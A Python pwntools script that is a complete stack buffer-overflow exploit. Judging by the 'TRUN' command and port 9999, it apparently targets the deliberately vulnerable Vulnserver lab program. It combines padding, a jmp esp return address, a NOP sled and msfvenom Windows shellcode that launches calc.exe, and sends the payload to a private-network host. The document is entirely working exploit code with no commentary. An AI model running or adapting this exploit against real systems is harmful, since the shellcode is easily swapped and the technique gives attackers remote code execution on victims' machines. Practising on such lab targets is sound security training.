#!/usr/bin/env python3

from pwn import *


padding = b'\x41' * 2003
nops =    b'\x90' * 64

# msfvenom -p windows/exec -b '\x00' -f py CMD=calc.exe
shellcode =  b""
shellcode += b"\xdb\xd7\xd9\x74\x24\xf4\xbd\xca\x9e\x6e\x40\x58\x31"
shellcode += b"\xc9\xb1\x31\x83\xc0\x04\x31\x68\x14\x03\x68\xde\x7c"
shellcode += b"\x9b\xbc\x36\x02\x64\x3d\xc6\x63\xec\xd8\xf7\xa3\x8a"
shellcode += b"\xa9\xa7\x13\xd8\xfc\x4b\xdf\x8c\x14\xd8\xad\x18\x1a"
shellcode += b"\x69\x1b\x7f\x15\x6a\x30\x43\x34\xe8\x4b\x90\x96\xd1"
shellcode += b"\x83\xe5\xd7\x16\xf9\x04\x85\xcf\x75\xba\x3a\x64\xc3"
shellcode += b"\x07\xb0\x36\xc5\x0f\x25\x8e\xe4\x3e\xf8\x85\xbe\xe0"
shellcode += b"\xfa\x4a\xcb\xa8\xe4\x8f\xf6\x63\x9e\x7b\x8c\x75\x76"
shellcode += b"\xb2\x6d\xd9\xb7\x7b\x9c\x23\xff\xbb\x7f\x56\x09\xb8"
shellcode += b"\x02\x61\xce\xc3\xd8\xe4\xd5\x63\xaa\x5f\x32\x92\x7f"
shellcode += b"\x39\xb1\x98\x34\x4d\x9d\xbc\xcb\x82\x95\xb8\x40\x25"
shellcode += b"\x7a\x49\x12\x02\x5e\x12\xc0\x2b\xc7\xfe\xa7\x54\x17"
shellcode += b"\xa1\x18\xf1\x53\x4f\x4c\x88\x39\x05\x93\x1e\x44\x6b"
shellcode += b"\x93\x20\x47\xdb\xfc\x11\xcc\xb4\x7b\xae\x07\xf1\x74"
shellcode += b"\xe4\x0a\x53\x1d\xa1\xde\xe6\x40\x52\x35\x24\x7d\xd1"
shellcode += b"\xbc\xd4\x7a\xc9\xb4\xd1\xc7\x4d\x24\xab\x58\x38\x4a"
shellcode += b"\x18\x58\x69\x29\xff\xca\xf1\x80\x9a\x6a\x93\xdc"

payload = flat(
    padding,
    p32(0x625011af), # jmp esp;
    nops, shellcode
)

with remote('192.168.122.193', 9999) as r:
    r.writeline(b'TRUN /.:/%s' % payload)

